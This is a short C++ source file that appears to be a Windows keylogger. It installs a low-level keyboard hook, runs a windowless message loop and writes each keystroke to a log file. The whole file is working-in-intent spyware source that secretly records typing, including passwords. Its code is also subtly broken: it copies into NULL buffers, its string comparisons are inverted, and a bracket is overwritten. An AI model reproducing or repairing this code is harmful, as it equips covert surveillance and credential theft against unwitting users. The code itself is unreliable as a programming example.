#include "stdafx.h"

HHOOK kbdhook;
LogFile logFile(_T(LOGFILE));
LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {	

	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handleKeysProc, GetModuleHandle(NULL), NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return OK;
}


LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
 	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		LPWSTR tmp = NULL;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lParam);
		bool printable;

		LPWSTR str = NULL;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		_tcscpy(str, tmp);

		printable = (_tcslen(tmp) <= 1) ? true : false;
		if (_tcscmp(tmp, _T("CAPSLOCK"))) {
			capslock = !capslock;
		}
		else if (_tcscmp(tmp, _T("SHIFT"))) {
			shift = true;
		}
		else if (_tcscmp(tmp, _T("ENTER"))) {
			_tcscpy(str, _T("\n"));
			printable = true;
		}
		else if (_tcscmp(tmp, _T("SPACE"))) {
			_tcscpy(str, _T(" "));
			printable = true;
		}
		else if (_tcscmp(tmp, _T("TAB"))) {
			_tcscpy(str, _T("\t"));
			printable = true;
		}
		else {
			_tcscpy(str, _T("["));
			_tcscat(str, tmp);
			_tcscpy(str, _T("]"));
		}

		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < _tcslen(str); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < _tcslen(str); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}
			shift = false;
		}

		logFile.Write(str);
	}
	return CallNextHookEx(kbdhook, nCode, wParam, lParam);
}
